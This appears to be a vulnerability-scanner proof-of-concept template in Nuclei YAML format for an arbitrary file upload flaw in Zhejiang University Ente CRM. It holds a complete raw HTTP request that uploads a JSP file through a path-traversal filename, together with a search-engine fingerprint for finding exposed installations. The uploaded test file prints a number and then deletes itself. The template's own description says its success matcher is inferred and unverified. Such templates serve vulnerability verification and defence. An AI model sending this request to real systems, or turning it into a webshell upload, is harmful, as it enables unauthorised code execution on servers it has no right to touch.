id: poc-45d1394a3ec0c1996085
info:
  name: 浙大恩特CRMzipFileUpload任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/45d1394a3ec0c199608561acb91256ef

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 45d1394a3ec0c199608561acb91256ef
    fofa: + hunter`app.name="浙大恩特 CRM"`
http:
- raw:
  - 'POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36

    Content-Type: multipart/form-data; boundary=00content0boundary00

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 260

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="../../stc.jsp"

    Content-Type: application/zip


    <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
